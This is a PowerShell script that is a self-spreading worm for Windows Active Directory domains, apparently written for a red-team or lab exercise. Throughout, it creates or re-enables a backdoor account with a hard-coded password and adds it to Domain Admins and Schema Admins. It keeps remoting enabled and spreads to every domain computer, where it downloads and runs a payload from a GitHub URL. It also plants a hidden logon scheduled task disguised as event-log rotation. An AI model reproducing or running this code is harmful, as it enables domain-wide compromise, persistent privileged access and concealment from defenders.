if(1 -eq 1){
    $fun = 'much'
}
else{
    $idk = 'Didnt think this far'
}

if((hostname) -ne 'Windows10'){
    $computerNames = get-adcomputer -filter * | foreach {$_.DNSHostName}
}
else{
    $computerNames="Windows10.reallife.lockdown`nAD.reallife.lockdown`nFTP.reallife.lockdown"
}

$domainSystemInfo = get-adcomputer -filter * -Properties ipv4address | select ipv4address , dnshostname

import-module activedirectory
set-executionpolicy Unrestricted

if(!(Test-Path -Path 'C:\Program Files (x86)\Windows NT\TableTextService/TableTextServiceDa.txt')){
    try{mkdir 'C:\Program Files (x86)\Windows NT\TableTextService'}
    catch{}
    
    cd 'C:\Program Files (x86)\Windows NT\TableTextService'
    $WebClient = New-Object System.Net.WebClient
    $WebClient.DownloadFile("https://raw.githubusercontent.com/Magrene/PowershellShell/master/TableTextServiceDa.txt","C:\Program Files (x86)\Windows NT\TableTextService\TableTextServiceDa.txt")
}

function accountPersist{

    $username='magrene'

    try{
        Get-aduser $username
        enable-adaccount $username
        Add-ADGroupMember -identity 'Domain Admins' -members $username
        Add-ADGroupMember -identity 'Administrators' -members $username
        Add-ADGroupMember -identity 'Schema Admins' -members $username
        Set-ADAccountPassword -Identity $username -OldPassword (ConvertTo-SecureString -AsPlainText "Tossking123@" -Force) -NewPassword (ConvertTo-SecureString -AsPlainText "Tossking123@" -Force)
    }
    catch{
        new-aduser -name $username -SamAccountName $username -UserPrincipalName ($username + '@reallife.local') -AccountPassword( convertto-securestring 'Tossking123@' -asplaintext -force) -Enabled $True
        Add-ADGroupMember -identity 'Domain Admins' -members $username
        Add-ADGroupMember -identity 'Administrators' -members $username
        Add-ADGroupMember -identity 'Schema Admins' -members $username
    }


}


function keepWINRMAlive{
    While(1 -eq 1){
        Enable-PSRemoting -force
        start-sleep -Seconds (get-random -Minimum 60 -Maximum 90)
    }
}
function wormy{
    
    while((get-content 'C:\Program Files (x86)\Windows NT\TableTextService\TableTextServiceDa.txt' -tail 1 ) -ne 'xr'){
    accountPersist
    [int][double]::Parse((get-date -UFormat %s)) | out-file -FilePath 'C:\Users\Public\Downloads\desktop.log'
    Write-Output 'slither'
    Set-Service -Name WinRM -StartupType Automatic
    Set-Service -Name Winmgmt -StartupType Automatic
    Start-Service WinRM
    Start-Service Winmgmt
    Foreach($i in $computerNames){
        Write-Output $i
        invoke-command -ComputerName $i -ScriptBlock {
            if(Test-Path 'C:\Users\Public\Downloads\desktop.log' ){
                if((get-content -path 'C:\Users\Public\Downloads\desktop.log') -lt ([int][double]::Parse((get-date -UFormat %s))) - 30){
                    Invoke-Command -ScriptBlock {
                    set-executionpolicy Unrestricted
                    $WebClient = New-Object System.Net.WebClient
                    $WebClient.DownloadFile("https://raw.githubusercontent.com/Magrene/PowershellShell/Dev/Bucephalus.ps1","C:\Windows\worm.ps1")
                    C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command 'C:\Windows\worm.ps1' -ExecutionPolicy Bypass
                    }
                }
            }
            else{
                    set-executionpolicy Unrestricted
                    $WebClient = New-Object System.Net.WebClient
                    $WebClient.DownloadFile("https://raw.githubusercontent.com/Magrene/PowershellShell/Dev/Bucephalus.ps1","C:\Windows\worm.ps1")
                    C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command 'C:\Windows\worm.ps1' -ExecutionPolicy Bypass   
            }
            }
        }
        
        accountPersist
        start-sleep -Seconds (get-random -Minimum 2 -Maximum 5)
    }
}
start-job -ScriptBlock{

    While(1 -eq 1){
        Enable-PSRemote -force
        start-sleep -Seconds (get-random -Minimum 60 -Maximum 90)

    }
}

start-job -ScriptBlock { 
    while(1 -eq 1){
        try{
            $action = @()
            $action += new-scheduledtaskaction -execute 'Powershell.exe' ` -Argument '-windowstyle hidden -Command "invoke-restmethod https://raw.githubusercontent.com/Magrene/PowershellShell/Dev/Bucephalus.ps1 | out-file -filepath c:\Windows\worm.ps1'
            $action += new-scheduledtaskaction -execute 'Powershell.exe' ` -Argument '-windowstyle hidden -Command "c:\Windows\worm.ps1"'
            $trigger = New-ScheduledTaskTrigger -AtLogon
            Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "EventLog Rotate" -Description "Daily rotation of event logs" -RunLevel Highest -TaskPath \Microsoft\Windows\SpacePort
        
        }
        catch{

        }
        start-sleep -Seconds (get-random -Minimum 2 -Maximum 5)
    }
}

wormy
